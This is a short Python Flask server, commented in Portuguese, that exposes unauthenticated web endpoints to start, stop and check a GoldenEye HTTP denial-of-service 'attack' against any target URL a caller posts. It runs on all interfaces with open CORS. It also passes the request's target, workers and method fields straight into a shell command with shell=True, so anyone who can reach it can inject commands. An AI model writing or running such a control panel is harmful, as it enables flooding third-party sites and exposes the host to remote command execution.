from flask import Flask, request, jsonify
import subprocess
import os
import time
from threading import Thread
from flask_cors import CORS
app = Flask(__name__)
CORS(app)

attack_process = None
is_attacking = False

@app.route('/start', methods=['POST'])
def start_attack():
    global attack_process, is_attacking
    
    data = request.json
    target = data.get('target')
    workers = data.get('workers', 10)
    method = data.get('method', 'get')  # get/post/slow
    
    if not target:
        return jsonify({"error": "URL alvo inválida"}), 400
    
    # Comando GoldenEye
    cmd = f"python ~/stress-tool/GoldenEye/goldeneye.py {target} -w {workers} -m {method}"
    
    # Mata processos anteriores
    if attack_process:
        attack_process.terminate()
    
    # Inicia o ataque em background
    attack_process = subprocess.Popen(cmd, shell=True)
    is_attacking = True
    
    return jsonify({"status": "Ataque iniciado", "target": target})

@app.route('/stop', methods=['POST'])
def stop_attack():
    global attack_process, is_attacking
    
    if attack_process:
        attack_process.terminate()
        attack_process = None
    
    is_attacking = False
    return jsonify({"status": "Ataque parado"})

@app.route('/status', methods=['GET'])
def check_status():
    return jsonify({"is_attacking": is_attacking})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
